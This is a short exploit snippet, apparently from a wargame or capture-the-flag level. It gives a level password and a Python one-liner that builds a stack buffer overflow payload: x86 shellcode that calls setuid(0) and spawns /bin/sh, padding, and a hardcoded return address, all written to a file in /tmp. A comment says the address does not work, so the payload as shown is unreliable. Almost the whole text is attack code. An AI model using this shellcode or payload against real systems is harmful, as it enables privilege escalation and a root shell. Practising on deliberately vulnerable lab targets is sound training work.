#pass = aesebootiv

python -c 'from struct import pack; print "\x31\xdb\x6a\x17\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*(79-30)+pack("<I",0xffffd6dd)'>/tmp/awesome5/bob

#last address is supposedly a static location on the stack, but it is not working properly
